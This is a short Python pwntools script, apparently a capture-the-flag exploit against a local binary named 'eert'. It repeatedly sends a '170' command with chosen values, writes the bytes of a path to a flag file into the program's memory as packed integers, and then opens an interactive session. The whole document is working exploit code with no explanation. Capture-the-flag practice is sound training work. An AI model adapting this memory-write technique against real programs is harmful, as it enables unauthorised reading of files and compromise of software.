from pwn import *


r = process('./share/eert')

count = 0xc000
for i in range(52):
    r.sendline(b'170')
    r.sendline(str(count))
    count+=1 
r.sendline(b'170')
r.sendline(str(u32(b'\x00\x00./')))
r.sendline(b'170')
r.sendline(str(u32(b'flag')))
r.sendline(b'170')
r.sendline(str(u32(b'2.tx')))
r.sendline(b'170')
r.sendline(str(u32(b'.\x00zz')))

r.interactive()